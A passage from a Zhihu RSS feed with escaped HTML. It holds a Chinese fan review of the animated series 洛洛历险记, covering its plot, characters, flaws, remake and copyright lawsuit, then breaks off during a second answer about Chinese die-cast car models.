src=\"https://pic2.zhimg.com/v2-91122350f0efcb3576013f0012d0f22f_720w.jpg?rss\" data-rawwidth=\"823\" data-rawheight=\"613\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-91122350f0efcb3576013f0012d0f22f\" data-watermark-src=\"v2-7f3d75f51665cf55ef750929ccd9cd55\" data-private-watermark-src=\"v2-97fe686ab9b3e72f6b6d9a592a0d8c04\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-ed0b9457227bda2e6f2a764698f867ef_720w.jpg?rss\" data-rawwidth=\"824\" data-rawheight=\"608\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-ed0b9457227bda2e6f2a764698f867ef\" data-watermark-src=\"v2-2f9d79a931e6af12aa6239259f0a0760\" data-private-watermark-src=\"v2-4138b79cc068b39a2d000f0e02ef1c58\"></p>\n<p>待攻占能源之城后，这也仅仅只是个开始。</p>\n<p>洛洛、闪电（城主）、霹雳火以及急先锋掉入火龙山谷，在此练习流影电光闪。</p>\n<p>而风火轮、龙卷风和力霸天则前往圣骑森林，一是为力霸天接回其断臂，二是寻找冲击波。</p>\n<p>之后狂野猩出来攻打猛虎王，金铁兽牺牲来救狂野猩。</p>\n<p>蓝毒兽背叛猛虎王，暴龙神来摘取胜利的果实，闪电战死，力霸天出手营救猛虎王，最后猛虎王掉下火龙山谷为这一篇章画上句号。</p>\n<p><br></p>\n<p>除此外，我对这个篇章映像深刻的一点就是，当初我家里有碟片机，当初看这部动画的方式是用光盘来看。而那时家里的电视机有一个臭毛病。</p>\n<p>即DVD播放到一定时间段时，就会蓝屏，即再也观看不下去。我也不知道这是何毛病。而恰好，每次看到能源之城攻防战的时候，就卡在那里。</p>\n<p>之后的剧情就再也看不到了，所以我一直很发疯，明明后续就在眼前，却无法观看，想起来就难受。</p>\n<p><b>最终战</b></p>\n<p>除了能源之城篇，最终战篇我也觉得可以具体展开讲讲。</p>\n<p>战前，机车族练成了合击了绝技，准备将猛兽族分而击之。</p>\n<p>不过，在后半段方才出现的猛兽族机战王晶晶改变了这一切，让本来可以较为顺利进行的计划蒙上一层阴影。</p>\n<p>暴龙神先来到狂野之城，明面上围魏救赵，实则是狂野猩调到亡灵之都。而猛虎王则选择放弃攻打雷霆殿，回到狂野之城，然后暴龙神再前往雷霆殿。至此，克制关系已经完全反了过来。</p>\n<p>按照其计划，猛兽族可以一举赢下机车族。</p>\n<p>不过，晶晶算漏了三点，</p>\n<p>第一点是忽视棋子自身情感，这一点在前文提到过，在此不再赘述。</p>\n<p>第二点就是蓝毒兽的存在，蓝毒兽拥有雷霆殿令牌，并将计划泄露给风火轮，最后让洛洛从亡灵之都逃出来，最后才得以让霹雳火与急先锋活下来。</p>\n<p>第三点则是留给霹雳火和急先锋的挂，月色。</p>\n<p>第一点导致前往狂野之城与亡灵之都的机车族没有死，全部聚集在雷霆殿当中。</p>\n<p>第二点导致整个计划被打乱。</p>\n<p>第三点则是导致没有霹雳火与急先锋没有被暴龙神杀死。</p>\n<p>机车族和猛兽族几乎全员到场，并且已经开战。</p>\n<p>二者也进入一个随时有可能你死我活的状态。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-04376315a18133734f286bc1d098124a_720w.jpg?rss\" data-rawwidth=\"1435\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-04376315a18133734f286bc1d098124a\" data-watermark-src=\"v2-29d27001bdad5b8cd728f12e23e1cb54\" data-private-watermark-src=\"v2-98f107dd167eed75a0cd870fab7d3c3c\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-be2264957612adb83afaccad62e76617_720w.jpg?rss\" data-rawwidth=\"751\" data-rawheight=\"570\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-be2264957612adb83afaccad62e76617\" data-watermark-src=\"v2-81700ed9396c8ffa94c86268a81443fe\" data-private-watermark-src=\"v2-bd87a70d47667a141a3b14012d83b857\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-e5661a52df66910b65921410d74ab897_720w.jpg?rss\" data-rawwidth=\"744\" data-rawheight=\"571\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-e5661a52df66910b65921410d74ab897\" data-watermark-src=\"v2-0db1fdf341750e755ec17ed2b4958d70\" data-private-watermark-src=\"v2-b826d58768d8a63caa434060c571c779\"></p>\n<p>最后以一种较为巧妙的方式解决了整个矛盾，即谈一谈。</p>\n<p>谈一谈，有时候真的可以解决问题。</p>\n<p>洛洛和晶晶都想回家，都需要对方的令牌，于是二者便选择合作，这样都可以一起回家了。</p>\n<p>这样机战王即不存在根本矛盾了，所以二者可以和平解决。</p>\n<p>可是，并未解决机车族和猛兽族的矛盾。</p>\n<p><br></p>\n<p>一个标准的王道少年动画剧本。</p>\n<p>情节能做到曲折而易懂，人物没有降智，亦未感受到相应降智，人物各种背叛与情感，以及即使是反派角色，亦有情有义。这种剧情，国内与之相似的有同样是国产动画的经典之作《虹猫蓝兔七侠传》。</p>\n<p><b>人物饱满</b></p>\n<p>《洛洛历险记》让人最为称道的是角色刻画，除了主角方机车族的刻画，反派方面的刻画亦不曾减少。</p>\n<p>无论是机车族，又或者是猛兽族，还是机战王，他们都会成长，都会改变。</p>\n<p><b>猛虎王</b>，他有一句经典的话，“<b>战争是一场肮脏的游戏，而我是一个肮脏的玩家</b>”。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-e84dce5c6c74be0037605180602f44d2_720w.jpg?rss\" data-rawwidth=\"755\" data-rawheight=\"562\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-e84dce5c6c74be0037605180602f44d2\" data-watermark-src=\"v2-b2c644223a313dbcdc420defdf0d36f6\" data-private-watermark-src=\"v2-3727b1565dc2ec272d0c33e53b325a69\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-e661a45668e9ad49cdba5bc2c4a2dd4e_720w.jpg?rss\" data-rawwidth=\"670\" data-rawheight=\"507\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-e661a45668e9ad49cdba5bc2c4a2dd4e\" data-watermark-src=\"v2-d33d16e98e8986957dd7071b0008a88a\" data-private-watermark-src=\"v2-d022a9af5b9e17e82bc23084c8718247\"></p>\n<p>猛虎王诡计多端，利用一切可以利用。以前他和狂野猩是朋友，后来为了利益可以三番五次算计狂野猩。他又极度讨厌叛徒，银铁兽背叛了狂野猩却被他转手杀死。</p>\n<p>不过当他开始频繁利用别人时，也许没有想到有面终有一天，自己也会被蓝毒兽背叛，亦绝不会想到，出来救他的是一自己暗算过多次的对手——力霸天。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-64384cf0c4b7cdc764a4186096dbbc5a_720w.jpg?rss\" data-rawwidth=\"754\" data-rawheight=\"554\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-64384cf0c4b7cdc764a4186096dbbc5a\" data-watermark-src=\"v2-a5f773e1eba5edee0f1d6d6ae24dfc4b\" data-private-watermark-src=\"v2-92cf2f0ef6097e71b4460dc8a2dd9b34\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-dd3aa325559dc39ebc9a816946913229_720w.jpg?rss\" data-rawwidth=\"743\" data-rawheight=\"562\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-dd3aa325559dc39ebc9a816946913229\" data-watermark-src=\"v2-083ca464b93e206e5f13ac6627cee8a3\" data-private-watermark-src=\"v2-260815ac4267ad72ed8d1bb24253dec5\"></p>\n<p>同样，猛虎王也想不到，当他向狂野猩借兵时，这个曾被他杀死过手下第一大将、多次暗算过狂野猩，可以借给他黑铁兽大军。并且狂野猩也没有要猛虎王的后备隐藏能源。</p>\n<p>猛虎王一直以来秉持想法，被现实一点点改变。</p>\n<p>所以他后来说出了“最珍贵的是朋友”这句话。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-80c0fe0865b1a63f2949ab649f1c2675_720w.jpg?rss\" data-rawwidth=\"749\" data-rawheight=\"567\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-80c0fe0865b1a63f2949ab649f1c2675\" data-watermark-src=\"v2-17204e7b2da13e499d5cf4ede725503b\" data-private-watermark-src=\"v2-e0071396e5c87216e730461892a9b6e9\"></p>\n<p>也是如此，最后才会放过力霸天和冲击波。</p>\n<p><br></p>\n<p><b>狂野猩</b>，一个迷信自己拳头的傻大个，以为自己在失去金铁兽后，便不再迷信自己的力量。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-7791a008833b5525d7c5b1f9ec5d1a79_720w.jpg?rss\" data-rawwidth=\"749\" data-rawheight=\"785\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-7791a008833b5525d7c5b1f9ec5d1a79\" data-watermark-src=\"v2-3edad96cbecf43d95e67f03255bbf5c8\" data-private-watermark-src=\"v2-69eebe8e216089374e741d3f01354999\"></p>\n<p>说起狂野猩，就不得不起金铁兽，金铁兽是在观众中人气很高，有勇有谋，忠心耿耿，多次救主，最后为了救出狂野猩，使用其后备隐藏能源，战死于沙场。</p>\n<p>金铁兽遇到了其伯乐，为狂野猩战死沙场也许是其最好的归宿。</p>\n<p>正所谓，士为知之者死。</p>\n<p><br></p>\n<p><b>暴龙神</b>，出场较晚，刻画亦比较少，一个典型的阴谋家，最后在能源之城篇后坐收渔人之利。可惜很快就被新猛兽族的机战王所控制，其个人想法并无太大展现，导致其并无太多刻画，可以说是挺可惜的。</p>\n<p><br></p>\n<p><b>霹雳火&amp;急先锋</b></p>\n<p>霹雳火，怜悯心太重，是其师父对霹雳火的评价。我认为他有一种精神，其名为博爱。在这个弱肉强食的世界里，尤为难得。</p>\n<p>强者才能生存的世界，还有情感存在。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-fd2e9633eb52b614382366e06541de99_720w.jpg?rss\" data-rawwidth=\"746\" data-rawheight=\"901\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-fd2e9633eb52b614382366e06541de99\" data-watermark-src=\"v2-aacf10cd730c6a6491e1ea16b7934393\" data-private-watermark-src=\"v2-19411593ce7f11588aaebf617c8f95f6\"></p>\n<p><br></p>\n<p>在后期，所有以强者为尊的角色，都或多或少因为情感而改变了观念，猛虎王、急先锋、龙卷风、狂野猩等等。</p>\n<p>除此之外，霹雳火还是洛洛的引路人。洛洛是游戏高手，却也无法理解这些事，毕竟也只是小毛孩。一切以自身利益至上的洛洛，也被霹雳火逐渐改变了其观念。</p>\n<p>全剧中，最少改变的就是他了。</p>\n<p>急先锋，名如其人，技能也亦如其人。一切都很急，亦很自大。</p>\n<p>然后被更强大的猛虎王所教育，便一蹶不振，其师父因此而死，月神殿亦因此而毁灭。</p>\n<p>之后，其心态亦改变很多，待到机战王洛洛来到后，方才重新找回其信念。</p>\n<p>一急一缓，组成一对，方能使其合击绝技“流影电光闪”。</p>\n<p><b>力霸天&amp;冲击波</b></p>\n<p>力霸天是典型的力量型选手，其性格亦是如此——稳重。</p>\n<p>本来是与世无争的一个推土机，但是其弟弟被蓝豹兽所杀之后，方才选择与霹雳火等人联手。</p>\n<p>路见不平，亦会拔刀相助，尊重一个战士，战士可以战死，但绝不能侮辱至死。</p>\n<p>冲击波，也是类似，只不过领地意识相对更强些见不贯欺负弱小之辈。</p>\n<p><b>龙卷风&amp;超音速</b></p>\n<p>龙卷风，据我观察，这是人气最高的机器人。</p>\n<p>首先是有个性。</p>\n<p>其次是帅，直升机与其它机器人相比，无论是其直升机形态还是其人形态，都是最好看的。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-9286a1dd7533faa0aa7e7997dc14f04d_720w.jpg?rss\" data-rawwidth=\"1432\" data-rawheight=\"1079\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-9286a1dd7533faa0aa7e7997dc14f04d\" data-watermark-src=\"v2-86cbe6eb986cc0b236ce95eec6b3fc44\" data-private-watermark-src=\"v2-e82b4f2162e1dd2f01fd4892f8e832ac\"></p>\n<p>这种有点痞痞的性格，再加上其强大的实力与其好看的机器身，人气高方才正常。</p>\n<p>其师父死（机车族人均死师父）后，其性格也越来越稳重。</p>\n<p>超音速，风雪之城城主，机车族第一高手。一开始因为师父风雪，而导致与其不和。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-5a2400e5549075713476948af5e473be_720w.jpg?rss\" data-rawwidth=\"1433\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-5a2400e5549075713476948af5e473be\" data-watermark-src=\"v2-30d06b5e80bba1ca17c1a429fc7a2126\" data-private-watermark-src=\"v2-1b7b5f41a974341c89b64d27e3f29649\"></p>\n<p>不过暴龙神的到来，反倒帮其来解决这多年以来未曾解决掉一段恩怨，一段闪电与风雪多年前的恩怨。</p>\n<p><b>洛洛</b></p>\n<p>一个无意间闯入游戏世界的小孩，亦是一个爱玩游戏的小孩。来到异世界后，会有想家的情绪，也会迷茫，不过在一步步地成长。</p>\n<p>他会为了自己输给女生而生气，会有好胜心。</p>\n<p>一开始他无法理解霹雳火等所做所为，不明白何为“大丈夫有所不为，有所必为”。</p>\n<p>后来看到金铁兽救了自己的时候，我想洛洛在那里就知道了何为</p>\n<p>不过渐渐地接受了自己机战王的身份，并担起了机战王的责任。</p>\n<p>但机战王到底是怎么样的，谁也不知道，只能靠猜，大家说洛洛是就是。</p>\n<blockquote>洛洛：我实在也不是谦虚，我一个小孩子，怎么就当上了机战王呢。</blockquote>\n<p><br></p>\n<p><b>蓝毒兽</b></p>\n<blockquote>战争是一场肮脏的游戏，而我是更肮脏的玩家。</blockquote>\n<p>一个绝对的利己主义者，本剧最成功的反派，无论是剧中还是剧外。</p>\n<p>阴枭，从其名字形象到其技能，无一透露着一股冷冰冰的感觉.</p>\n<p><img src=\"https://pic2.zhimg.com/v2-0d88d9d7dba4aa9b1118213250fec655_720w.jpg?rss\" data-rawwidth=\"745\" data-rawheight=\"555\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-0d88d9d7dba4aa9b1118213250fec655\" data-watermark-src=\"v2-8fc91463e47b62e24e8986ec4c03353d\" data-private-watermark-src=\"v2-04a1c8ae4c838bec6fd5153f7c92500d\"></p>\n<p>小个子而又类似于一种蚁兽的外形，与其他机器人有一股截然不同的感觉，其名字与其手下名字紫毒兽，都透着一股奇怪的气息。</p>\n<p>幽冥音波功，这个技能是一个声音攻击，中招者会使自身能力下降。</p>\n<p>每次在屏幕上看到他，都会感觉到很危险。</p>\n<p>在能源之城离间闪电和风雪，让其兄弟反目成仇，虽然自己的部族也被灭了。</p>\n<p>投奔暴龙神，暴龙神便将其安插在猛虎王那里，猛虎王也心知蓝毒兽另有所图，但还是选择留下他，因为这样可以利用他。</p>\n<p>可惜最后还是被蓝毒兽反利用了。</p>\n<p>大决战前抢下时光之城的令牌，以令牌胁迫两个机战王下约定，约定永不侵犯蓝毒兽。</p>\n<p>一般这种小人，在其他少儿动画中，少年动画里，最后的结局都不会好，不是死也会是一种较为惨淡的结局，譬如发疯、脑残。但是《洛洛》里竟然让其逍遥法外，这是我没想到的，也许当年在电视机前看动画的人也没有几个人能想到。</p>\n<p><b>其它优点</b></p>\n<p>合体技能的设计很好，单打独斗斗不过，但是使用其合体技便能赢下。并且有相对应的克制关系，更为奇妙的是，机车族这一方一个合体技能克制猛兽族一方，而猛兽族这一方换一个对象即可打败机车族。如猛虎王对冲击波&amp;力霸天。</p>\n<p>除此之外，就是很帅，合体技能的动画很帅。</p>\n<p>除此之外，还有一招特殊的合体技——月色血风暴。</p>\n<p>最后月色血风暴的那招，真的是挺让年幼的我挺激动的。</p>\n<p>洛洛被逼入绝境，最后依照月亮的力量，使出最后的绝招“月色血风暴”，虽然仍是无特殊效果，不过在其剧情、背景音乐的角度下显得尤为激动人心。</p>\n<p>现在想想，月光即为HP这个挂还是过于强了，即使这个挂是有伏笔的，霹雳火和急先锋身上都一堆月亮元素，月神殿、时光之城、雷霆半月斩等等，还在霹雳火在第一次月光之下使出其雷霆半月斩。</p>\n<p><b>缺点</b></p>\n<p>整个世界都很奇怪，</p>\n<p>比如机器人是如何生产出来的？剧中没有解释。</p>\n<p>为何在机器人的世界里，洛洛一个碳基生物在这里却没有人感到奇怪。</p>\n<p>机器人是靠什么补充能量的？源源不断的能量是从何而来？</p>\n<p>风火轮一个机器人怎么会开一些私生子的玩笑？</p>\n<p>洛洛怎么从不会感到饥饿？</p>\n<p>……</p>\n<p>但是又不是很奇怪，因为这个世界的产生就很不正常，是人为制造出来的。</p>\n<p>一切都是由程序算法而做成的。</p>\n<p>还是得说下其它缺点，这部动画的缺点还是挺多的，很大一部分是源于钱，另一方面可以说是由于经验不足。</p>\n<p>最直观的是打斗画面，这是蓝弧第一部真正意义上的打斗动画，其动作设计约等于没有。都是简单走走走，放技能，而后在比力气。</p>\n<p>兼用卡太多，不过这个在后期改善了很多，前几集里，黑铁兽大军的那段，真的是一个接一个来重复。</p>\n<p>还有就是少儿作品的通病了吧，动画技能的变身过多，但是不变身的话总感觉缺了什么，因为本来就没什么好的动作设计，并且其技能特效也约等于没有，大多时候就在那时比力气……</p>\n<p>除此之外，一些情节，不得不降智。譬如《引蛇出洞》这一集，猛虎王刚受了伤，又明白急先锋不可能是只有一个人，并且他们很有可能练成了“流影电光闪”，如此草率追出去，明显地给猛虎王降智了。</p>\n<h3>重制</h3>\n<p>开头方面，由一个网瘾少年更改为一个电竞少年，缺乏了代入感以及共鸣感。</p>\n<p>《洛洛历险记》在当初能火，很大程度是因为同是相对普通的少年，利用现实世界中的游戏知识，在游戏世界里一步步成长，带领相对较弱的机车族一步步地能与其抗衡。</p>\n<p>在此期间，这部动画带了一个其名为爽感的情绪。</p>\n<p>而阵子看了一个问题“如何看待穿越小说中，一个普通人穿越后智商爆表，完爆几十岁的老狐狸？”， 下面 <a class=\"member_mention\" href=\"http://www.zhihu.com/people/47ec72b16d39036ae7817992f4be8c4c\" data-hash=\"47ec72b16d39036ae7817992f4be8c4c\" data-hovercard=\"p$b$47ec72b16d39036ae7817992f4be8c4c\">@三叔侃侃</a> 的回答中指出两点爽文特征</p>\n<blockquote>\n<b>一、主人公起点不能过于夸张，否则缺乏代入感。</b><br><b>二、主人公必须在剧情过程中不断开启金手指和上帝视角，从而实现常人所不能。</b><sup data-draft-node=\"inline\" data-draft-type=\"reference\" data-numero=\"3\" data-text=\"\" data-url=\"https://www.zhihu.com/question/376857581/answer/1834736238\">[3]</sup>\n</blockquote>\n<p>照此来看，洛洛历险记亦是一标准的穿越型小说，不过十岁的小毛孩可以与活了几百年的猛虎族斗智斗勇。</p>\n<p>不过，这不正是我当初喜欢《洛洛》的原因吗。</p>\n<h3>后续</h3>\n<p>《百变机兽之洛洛历险记》，从其名字可以看出，百变机兽肯定不止这么一部作品。是的，百变机兽是一个系列，并且除了《洛洛历险记》外，还有一系列后续作品。</p>\n<p>譬如《神龙拯救队之元气星魂》</p>\n<p><img src=\"https://pic3.zhimg.com/v2-14a89ea824b03746dde38108ad98d647_720w.jpg?rss\" data-rawwidth=\"1601\" data-rawheight=\"1000\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-14a89ea824b03746dde38108ad98d647\" data-watermark-src=\"v2-248f6a0dee55cfef743e6c291078fc52\" data-private-watermark-src=\"v2-9526e133967ec51c84d19fe83ea89545\"></p>\n<p>《霹雳勇士之元气勇者》</p>\n<p><img src=\"https://pic1.zhimg.com/v2-67e04965964c8823d94f368d1e82cd6c_720w.jpg?rss\" data-rawwidth=\"800\" data-rawheight=\"800\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-67e04965964c8823d94f368d1e82cd6c\" data-watermark-src=\"v2-d884db7aad409a2bf1404f52fe49a591\" data-private-watermark-src=\"v2-80ff6665f0cf06b41dbcc3cd2124cdc1\"></p>\n<p>以及《元气拯救队》</p>\n<p><img src=\"https://pic2.zhimg.com/v2-1670333acb6e687a8cae3fcd6854c111_720w.jpg?rss\" data-rawwidth=\"695\" data-rawheight=\"817\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-1670333acb6e687a8cae3fcd6854c111\" data-watermark-src=\"v2-3b082e57819708e96a588a935c40504c\" data-private-watermark-src=\"v2-06a971ec71c74565467ef5057f09b277\"></p>\n<p>从其机器人外表来看，这三部都是百变机兽的系列作品，只不过世界观和制作公司与《洛洛》完全无关。</p>\n<p>这三部动画的制作均由星杰和湖南金鹰联合出品，星原进行制作的作品。</p>\n<p>至于为何不与蓝弧合作，我不清楚其内幕。明明二者的合作是属于互相成就，推测是二者对于版本的归属有了争议。</p>\n<p>以至于后来蓝弧和奥飞联合制作了重制版动画《武战道》，不过却被星杰告上法庭，最后于2018年宣判。</p>\n<blockquote>2018年4月20日，法院作出一审判决，认定《武战道》侵犯该剧著作权人的权利，酌情判令三被告（蓝弧动漫、蓝弧文化、奥飞）共同向该剧权利人王巍支付著作权使用费120万元。<sup data-draft-node=\"inline\" data-draft-type=\"reference\" data-numero=\"4\" data-text=\"\" data-url=\"https://baike.baidu.com/reference/8103125/4bec-P9AbeZ0Vakwoerm9kZcAnShQO88WNAJJ_hMYx2FbfGvAbZDfnTREgcVzsavmFPOUucErSwFQSF5hm3LIzm5Buw\">[4]</sup>\n</blockquote>\n<p>一个剧本拍出两部动画，谁侵权？</p>\n<p>我不大熟悉法律，将其判决放在此处，读者可自行评判。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-86159e9d9bbaa04ac951438852742417_720w.jpg?rss\" data-rawwidth=\"841\" data-rawheight=\"827\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-86159e9d9bbaa04ac951438852742417\" data-watermark-src=\"v2-1732b4298895f0d7c47608c6b48bcbc8\" data-private-watermark-src=\"v2-c75e88bac0dd4f2f978b31506a154c77\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-b3edd5ce4627d8c861acde3af7131173_720w.jpg?rss\" data-rawwidth=\"866\" data-rawheight=\"826\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-b3edd5ce4627d8c861acde3af7131173\" data-watermark-src=\"v2-6ae0e596892aa85d7d1357d0ef569d84\" data-private-watermark-src=\"v2-f341d3e7c0bf48e47f46ec2c11929a37\"></p>\n<p><sup data-draft-node=\"inline\" data-draft-type=\"reference\" data-numero=\"5\" data-text=\"一个剧本拍出两部动画，谁侵权？\" data-url=\"https://gd.qq.com/a/20180419/029886.htm\">[5]</sup></p>\n<p>我对这个版权归属争议的看法很简单，即是遗憾。</p>\n<p>若是星杰仍继续与蓝弧合作，其后续至少比上述这些动画更有看头。</p>\n<p>可以出前传，前一任机战王的经历；亦可以出后续，最后机车族与猛兽族还是打了起来，因为最后仅仅只是洛洛和晶晶的矛盾解决，而机车族与猛兽族的根本矛盾从未解决，其根本矛盾即程序设计开始，便植入其根中的战斗设计。</p>\n<p>回到现实世界中，洛洛和晶晶仍在互相对战，一切又似乎回到了原点。</p>\n<p>但一切都在在2009年戛然而止，《洛洛历险记》最终还是没有其后续之作。</p>\n<h3>结语</h3>\n<p>其作品本身而言，一部有缺点，但是剧情优秀，人物刻画饱满的作品。</p>\n<p>一部奠定蓝弧风格的作品，自此，蓝弧完成了从制作日常动画变成了制作机甲动画的转换。</p>\n<p>也因这部动画而迈向其巅峰期，不过，五年后重制版折戟，使得蓝弧不得不再寻找转型之路。</p>\n<p>若仅仅也是折戟，亦还可接受，动画总会有成败，此时（2014）的蓝弧不再是五年前的小公司，此时已经拥有一定的经济实力，亦有相对应的抗压能力。此事带来其后果是，与星杰翻脸，并开始了官司之路。</p>\n<p>蓝弧此时可能未曾想到，它所面临的版权问题，仅仅只是开始。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-dac1ca748f8731f819837af7b4b3ca8e_720w.jpg?rss\" data-rawwidth=\"746\" data-rawheight=\"558\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-dac1ca748f8731f819837af7b4b3ca8e\" data-watermark-src=\"v2-b811c8b29f1413a2166c088d58a0530c\" data-private-watermark-src=\"v2-3c676be8309847a08e5f970f95ecdb4b\"></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/jinl1874?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">道理</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/63320560/answer/1891698659?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">27 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/29003517?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价天元突破里的人物？</a><br><a href=\"http://www.zhihu.com/question/272101362?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">那些动画形象贯穿你的童年？</a><br>\n","link":"http://www.zhihu.com/question/63320560/answer/1891698659?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"中国的模型玩具制造水平达到了什么程度？","date":"2021-07-04 15:30:08","description":"\n<p>说说静态汽车模型吧，简直就是逆袭的典范。</p>\n<p>如果在 10 年前，国产汽车模型还是入门和低端的代名词。那个时候市面上主流的模型，诸如 AutoArt、京商、minichamps，1:18 模型在 500-1000 元的主流价位，1:43 模型在 100-300 左右的价位，做出了非常多经典的汽车模型，形态准确，细节丰富，可玩性也很出色。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-7c11c70ad196a980bcfdee470c581725_720w.jpg?rss\" data-rawwidth=\"1280\" data-rawheight=\"852\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-7c11c70ad196a980bcfdee470c581725\" data-watermark-src=\"v2-c8ec50de56be8017abd80e78642eec95\" data-private-watermark-src=\"v2-04a4c476ea895ec860d37592fe13e2a1\"></p>\n<p>比如图上这四台 1:43 的小比例模型，左1和右1是 AutoArt 全盛时期的作品，在不到 10cm 的小尺寸上实现了前轮转向，逼真的车灯细节。在 1:18 的大尺寸上，则有全部车门可开，方向盘车轮转件，内饰和后备箱植绒、独立的安全带扣甚至可动的后排中央扶手箱等等等丰富的细节。更是创造了无数如今难以企及的海景房车型，比如 AutoArt 的奔驰系列：</p>\n<p><img src=\"https://pic2.zhimg.com/v2-83c2e969cf8846da4ed100f43ecad1b6_720w.jpg?rss\" data-rawwidth=\"580\" data-rawheight=\"435\" data-size=\"normal\" data-caption=\"贴吧拿图，原作者：凌云壮志，侵删（这台是原厂版，仅前门能开）\" data-watermark=\"original\" data-original-src=\"v2-83c2e969cf8846da4ed100f43ecad1b6\" data-watermark-src=\"v2-17bc7df3ef0714be36b5121ac85e72d8\" data-private-watermark-src=\"v2-71723eb9500af1ec657a40ef866a8cdf\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-3735704804765db5889039ec0f303b30_720w.jpg?rss\" data-rawwidth=\"580\" data-rawheight=\"435\" data-size=\"normal\" data-caption=\"贴吧拿图，奔驰 280SE，原作者：Chelly，侵删\" data-watermark=\"original\" data-original-src=\"v2-3735704804765db5889039ec0f303b30\" data-watermark-src=\"v2-8645fdde68aaf78442e6c74ab8818ccd\" data-private-watermark-src=\"v2-42e683ed921ba4ff5c7815d543deac30\"></p>\n<p>如果你对以上产品没有什么概念，那我们一起看下同时代的国产模型翘楚，威力 Welly，产品在在 200-300 价位的 1:18 模型，是这样的： </p>\n<p><img src=\"https://pic2.zhimg.com/v2-23bfbf4ec5ede674b17714c5a5a2abd9_720w.jpg?rss\" data-rawwidth=\"800\" data-rawheight=\"800\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-23bfbf4ec5ede674b17714c5a5a2abd9\" data-watermark-src=\"v2-3e32084170a3a69f736c32875fc2ff63\" data-private-watermark-src=\"v2-378e2378e1e73e30ff2f8c8fc217b27d\"></p>\n<p>虽然已经有了相当不错的型准，但是整体做工相当粗糙，比如粗大且质感低劣的镀铬件，大灯中黑色的固定点，也就是传说中的死鱼眼，还有较弱的可玩性，这款大众 T1 似乎只有 2-3 个门可以开，而相近的舒克的模型，是这样的：</p>\n<p><img src=\"https://pic4.zhimg.com/v2-692cc8ff0f6ef8179ca940d131f32359_720w.jpg?rss\" data-rawwidth=\"1200\" data-rawheight=\"1200\" data-size=\"normal\" data-caption=\"舒克的 T1，变态的全开展示，客运版甚至还有布艺的可动顶棚，图源：东西皇朝，已经好久没有听过这家店了\" data-watermark=\"original\" data-original-src=\"v2-692cc8ff0f6ef8179ca940d131f32359\" data-watermark-src=\"v2-95cbb12c2710378030647dafc371a290\" data-private-watermark-src=\"v2-3f0c2a26e78fbd95ec5a72adc8595779\"></p>\n<p>当然也有稍好一些的，比如威利的林肯领航员，型准、镀铬细节都进步很大，只是后门依旧不能开：</p>\n<p><img src=\"https://pic4.zhimg.com/v2-13d921c3575cfa2d8e0c05e4f30104be_720w.jpg?rss\" data-rawwidth=\"1024\" data-rawheight=\"717\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" 